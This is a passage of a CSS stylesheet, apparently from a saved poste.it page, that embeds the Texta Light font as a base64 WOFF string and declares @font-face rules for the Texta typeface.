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) format('woff'), /* Modern Browsers */
         /*savepage-url=/risorse_dt/condivise/fonts/texta/Texta-Light/Texta-Light.ttf*/ url() format('truetype'), /* Safari, Android, iOS */
         /*savepage-url=/risorse_dt/condivise/fonts/texta/Texta-Light/Texta-Light.svg#Texta-Light*/ url() format('svg'); /* Legacy iOS */
    font-style: normal;
    font-weight: 300;
    text-rendering: optimizeLegibility;
}


/* END Light */


/* BEGIN Book */
/*
@font-face {
    font-family: 'Texta';
    src: url("/risorseweb/poste_it/risorseweb/poste_it/risorse_dt/condivise/fonts/texta/Texta-Book.otf");
    font-style: normal;
    font-weight: 400;
}
*/
@font-face {
    font-family: 'Texta';
    src: /*savepage-url=/risorse_dt/condivise/fonts/texta/Texta-Book/Texta-Book.eot*/ url(); /* IE9 Compat Modes */
